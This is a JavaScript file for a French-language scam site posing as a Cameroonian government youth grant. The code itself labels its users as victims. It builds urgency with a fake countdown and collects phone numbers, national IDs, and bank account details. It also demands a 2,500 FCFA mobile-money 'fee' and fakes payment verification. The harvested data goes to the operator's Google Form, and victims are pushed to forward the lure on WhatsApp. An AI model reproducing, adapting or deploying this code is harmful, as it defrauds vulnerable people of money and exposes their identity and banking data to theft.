// Configuration - METS TES VRAIS NUMÉROS!
const CONFIG = {
    orangeMoneyNumber: "bientot", // ← REMPLACE!
    mtnMoneyNumber: "673 272 421",
    adminFee: 2500, // Nouveau prix
    whatsappMessage: "Le Gouvernement Camerounais donne 500,000 FCFA aux jeunes. Je viens de faire ma demande. Dépêche-toi avant la fin du quota! 👇 https://js6124669-wq.github.io/subvention-jeunes/",
    googleFormID: "1FAIpQLSeXriGwzmBcHLwVhbE4DFtmnNdiWGFySXcaLuXNi15JldEQ_g"
};

let currentStep = 1;
let userData = {};
let allVictimsData = []; // ← NOUVEAU: Stockage backup

// ==================== NOUVELLES FONCTIONS CRITIQUES ====================

// 🔥 FONCTION BACKUP - Stocke les données LOCALEMENT
function backupVictimData(data) {
    const victimRecord = {
        timestamp: new Date().toISOString(),
        phone: data.phone,
        personalInfo: data.personalInfo,
        bankInfo: data.bankInfo,
        transactionCode: data.transactionCode,
        paymentMethod: data.paymentMethod,
        step: 'COMPLETED'
    };
    
    // Sauvegarde dans un tableau global
    allVictimsData.push(victimRecord);
    
    // Sauvegarde dans le localStorage du navigateur
    const backupKey = `victim_${Date.now()}`;
    localStorage.setItem(backupKey, JSON.stringify(victimRecord));
    
    console.log('💾 BACKUP SAUVEGARDÉ:', victimRecord);
    console.log('📊 TOTAL VICTIMES:', allVictimsData.length);
    
    // Affiche toutes les données dans la console pour debug
    displayAllCapturedData();
}

// 🔥 AFFICHAGE DES DONNÉES CAPTURÉES (pour debug)
function displayAllCapturedData() {
    console.log('======= 📋 DONNÉES CAPTURÉES =======');
    console.log('Données actuelles:', userData);
    console.log('Toutes les victimes:', allVictimsData);
    console.log('====================================');
}

// 🔥 FONCTION GOOGLE FORM CORRIGÉE
function sendToGoogleForm(data, isFinal = false) {
    console.log('🔄 TENTATIVE ENVOI GOOGLE FORM...');
    
    // Backup IMMÉDIAT avant tout envoi
    backupVictimData(data);
    
    // Vérification sécurité
    if (!CONFIG.googleFormID || CONFIG.googleFormID.includes('TON_ID')) {
        console.error('❌ ID GOOGLE FORM NON CONFIGURÉ!');
        return;
    }
    
    // IDs TEMPORAIRES - À VÉRIFIER AVEC TON FORM
    const fieldMapping = {
        "entry.1127196694": data.phone || 'NON RENSEIGNÉ',
        "entry.1336914721": data.personalInfo?.fullName || 'NON RENSEIGNÉ',
        "entry.401740454": data.personalInfo?.nationalId || 'NON RENSEIGNÉ', 
        "entry.2064465324": data.personalInfo?.region || 'NON RENSEIGNÉ',
        "entry.668103226": data.bankInfo?.bankName || 'NON RENSEIGNÉ',
        "entry.495506041": data.bankInfo?.accountNumber || 'NON RENSEIGNÉ',
        "entry.81584951": data.transactionCode || 'NON RENSEIGNÉ',
        "entry.2131029599": isFinal ? 'COMPLETED' : 'PAYMENT_MADE',
        "entry.2113777428": new Date().toISOString()
    };
    
    console.log('📤 Champs à envoyer:', fieldMapping);
    
    // Construction des données
    const formData = new URLSearchParams();
    for (const [fieldId, value] of Object.entries(fieldMapping)) {
        if (value) formData.append(fieldId, value);
    }
    
    const googleFormURL = `https://docs.google.com/forms/d/e/${CONFIG.googleFormID}/formResponse`;
    
    // Envoi avec timeout
    Promise.race([
        fetch(googleFormURL, {
            method: "POST",
            body: formData,
            mode: "no-cors",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        }),
        new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 5000)
        )
    ])
    .then(() => console.log('✅ ENVOI RÉUSSI (ou semblant)'))
    .catch(error => console.error('❌ ERREUR ENVOI:', error));
}

// ==================== FONCTIONS EXISTANTES CORRIGÉES ====================

// Initialize the page
function init() {
    updateProgressBar();
    startTimer();
    showStep(1);
    console.log('🚀 Application initialisée - Prête à capturer');
}

// Show specific step
function showStep(stepNumber) {
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(`step${stepNumber}`).classList.add('active');
    currentStep = stepNumber;
    updateProgressBar();
}

// Update progress bar
function updateProgressBar() {
    const progress = (currentStep / 5) * 100;
    document.getElementById('progress').style.width = `${progress}%`;
}

// Timer countdown
function startTimer() {
    let time = 2 * 60 * 60 + 59 * 60 + 59;
    const timerElement = document.getElementById('timer');
    
    const countdown = setInterval(() => {
        const hours = Math.floor(time / 3600);
        const minutes = Math.floor((time % 3600) / 60);
        const seconds = time % 60;
        
        timerElement.textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (time <= 0) {
            clearInterval(countdown);
            timerElement.textContent = "Temps écoulé!";
            timerElement.style.background = "#ce1126";
        }
        time--;
    }, 1000);
}

// Step 1: Check Eligibility
function checkEligibility() {
    const phone = document.getElementById('phone').value;
    if (!phone || phone.length < 9) {
        alert("Veuillez entrer un numéro de téléphone valide");
        return;
    }
    
    userData.phone = phone;
    console.log('📞 Numéro capturé:', phone);
    nextStep(1);
}

// Navigate to next step
function nextStep(fromStep) {
    if (fromStep === 2 && !validateStep2()) return;
    if (fromStep === 3 && !validateStep3()) return;
    
    showStep(fromStep + 1);
    
    if (fromStep === 2) savePersonalInfo();
    if (fromStep === 3) saveBankInfo();
}

// Validate Step 2
function validateStep2() {
    const requiredFields = ['fullName', 'birthDate', 'nationalId', 'region'];
    for (let field of requiredFields) {
        if (!document.getElementById(field).value) {
            alert("Veuillez remplir tous les champs obligatoires");
            return false;
        }
    }
    return true;
}

// Validate Step 3
function validateStep3() {
    const requiredFields = ['bankName', 'accountNumber', 'accountHolder'];
    for (let field of requiredFields) {
        if (!document.getElementById(field).value) {
            alert("Veuillez remplir tous les champs obligatoires");
            return false;
        }
    }
    return true;
}

// Save personal information
function savePersonalInfo() {
    userData.personalInfo = {
        fullName: document.getElementById('fullName').value,
        birthDate: document.getElementById('birthDate').value,
        nationalId: document.getElementById('nationalId').value,
        region: document.getElementById('region').value
    };
    console.log('👤 Infos perso capturées:', userData.personalInfo);
    displayAllCapturedData(); // ← AFFICHAGE DEBUG
}

// Save bank information
function saveBankInfo() {
    userData.bankInfo = {
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        accountHolder: document.getElementById('accountHolder').value
    };
    console.log('🏦 Infos bancaires capturées:', userData.bankInfo);
    displayAllCapturedData(); // ← AFFICHAGE DEBUG
}

// Step 4: Payment method selection
function selectPayment(method) {
    const instructions = document.getElementById('instructionsText');
    const paymentDiv = document.getElementById('paymentInstructions');
    
    userData.paymentMethod = method;
    
    if (method === 'orange') {
        instructions.innerHTML = `Veuillez effectuer le paiement de <strong>2.500 FCFA</strong> au numéro Orange Money: <strong>${CONFIG.orangeMoneyNumber}</strong>`;
    } else {
        instructions.innerHTML = `Veuillez effectuer le paiement de <strong>2.500 FCFA</strong> au numéro MTN Mobile Money: <strong>${CONFIG.mtnMoneyNumber}</strong>`;
    }
    
    paymentDiv.style.display = 'block';
    console.log('💳 Méthode paiement:', method);
}

// Step 4: Verify payment - CRITIQUE!
function verifyPayment() {
    const transactionCode = document.getElementById('transactionCode').value;
    if (!transactionCode) {
        alert("Veuillez entrer le code de transaction");
        return;
    }
    
    userData.transactionCode = transactionCode;
    console.log('💰 Code transaction:', transactionCode);
    
    document.getElementById('step4').innerHTML = `
        <h2>Vérification en cours...</h2>
        <p>Veuillez patienter pendant que nous vérifions votre paiement.</p>
        <div class="loading">⏳</div>
    `;
    
    setTimeout(() => {
        userData.paymentVerified = true;
        userData.paymentTime = new Date().toISOString();
        
        console.log('✅ Paiement vérifié - Données complètes:', userData);
        
        // ENVOI IMMÉDIAT des données
        sendToGoogleForm(userData);
        displayAllCapturedData();
        
        nextStep(4);
    }, 3000);
}

// Step 5: WhatsApp sharing
function shareOnWhatsApp() {
    const shareText = encodeURIComponent(CONFIG.whatsappMessage);
    const whatsappUrl = `https://wa.me/?text=${shareText}`;
    
    window.open(whatsappUrl, '_blank');
    
    document.getElementById('shareStatus').innerHTML = `
        <p style="color: green; margin-top: 15px;">
        ✅ Merci! Retournez sur WhatsApp pour partager le message.
        </p>
        <button onclick="completeApplication()" style="background: #25D366;">
        ✅ J'ai partagé, finaliser ma demande
        </button>
    `;
}

// Final completion
function completeApplication() {
    userData.completedAt = new Date().toISOString();
    userData.finalStatus = 'COMPLETED';
    
    console.log('🎉 DEMANDE COMPLÈTE - Données finales:', userData);
    
    // Dernier envoi avec statut final
    sendToGoogleForm(userData, true);
    displayAllCapturedData();
    
    document.getElementById('step5').innerHTML = `
        <div style="text-align: center; padding: 40px 20px;">
            <h2 style="color: #007e3a;">✅ Demande Soumise avec Succès!</h2>
            <p>Votre demande de subvention de 500,000 FCFA a été enregistrée.</p>
            <p><strong>Numéro de référence:</strong> CM-PAIJ-${Date.now()}</p>
            <p>Vous recevrez un SMS de confirmation dans les 24 heures.</p>
        </div>
    `;
}

// ==================== FONCTION DEBUG ====================

// Fonction pour voir TOUTES les données capturées
function showAllData() {
    console.log('======= 🔍 DEBUG - TOUTES LES DONNÉES =======');
    console.log('Données actuelles:', userData);
    console.log('Toutes les victimes:', allVictimsData);
    console.log('LocalStorage backups:');
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.startsWith('victim_')) {
            console.log(key, JSON.parse(localStorage.getItem(key)));
        }
    }
    console.log('============================================');
}

// Rendre la fonction accessible globalement
window.showAllData = showAllData;

// Initialize the application when page loads
document.addEventListener('DOMContentLoaded', init);